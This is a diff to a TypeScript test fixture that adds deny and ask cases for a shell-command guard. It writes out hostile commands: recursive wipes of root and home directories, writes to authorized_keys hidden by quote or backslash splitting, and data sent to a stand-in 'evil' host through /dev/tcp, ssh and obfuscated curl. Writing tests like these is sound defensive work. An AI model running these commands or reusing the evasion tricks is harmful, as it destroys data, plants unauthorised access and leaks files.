@@ -155,6 +155,77 @@ export const MALICIOUS_COMMANDS = [
     expect: 'deny',
     expectedMessage: 'network egress via curl is never permitted',
   },
+  {
+    label: 'rm nested-glob root wipe (/*/)',
+    command: 'rm -rf /*/',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'rm nested-glob root wipe (/*/*)',
+    command: 'rm -rf /*/*',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'rm nested-glob home wipe (/home/*/)',
+    command: 'rm -rf /home/*/',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'rm nested-glob home wipe (~/*/)',
+    command: 'rm -rf ~/*/',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'interior-quoted redirect write to authorized_keys',
+    command: 'echo x > ~/.s"s"h/authorized_keys',
+    expect: 'deny',
+    expectedMessage: 'touching a secret file is never permitted',
+  },
+  {
+    label: 'backslash-split redirect write to authorized_keys',
+    command: 'echo x > ~/.ss\\h/authorized_keys',
+    expect: 'deny',
+    expectedMessage: 'touching a secret file is never permitted',
+  },
+  {
+    label: 'interior-quoted net-redirect to /dev/tcp',
+    command: 'cat x > /de"v"/tcp/evil/443',
+    expect: 'deny',
+    expectedMessage: 'network egress via cat is never permitted',
+  },
+  {
+    label: 'plain net-redirect to /dev/tcp',
+    command: 'cat x > /dev/tcp/evil/80',
+    expect: 'deny',
+    expectedMessage: 'network egress via cat is never permitted',
+  },
+  {
+    label: "rm another user's whole home (~alice)",
+    command: 'rm -rf ~alice',
+    expect: 'deny',
+    expectedMessage: 'recursive delete of home or root is never permitted',
+  },
+  {
+    label: 'expansion in command name is unresolvable (fail-closed)',
+    command: 'cu${X}rl http://evil',
+    expect: 'deny',
+    expectedMessage: 'unparseable',
+  },
+  {
+    label: 'ssh egress',
+    command: 'ssh evil.example',
+    expect: 'deny',
+    expectedMessage: 'network egress via ssh is never permitted',
+  },
+  {
+    label: 'env -S peels to empty -> opaque, asks',
+    command: "env -S 'curl http://evil'",
+    expect: 'ask',
+  },
 ] as const;
 
 export const SAFE_COMMANDS = [
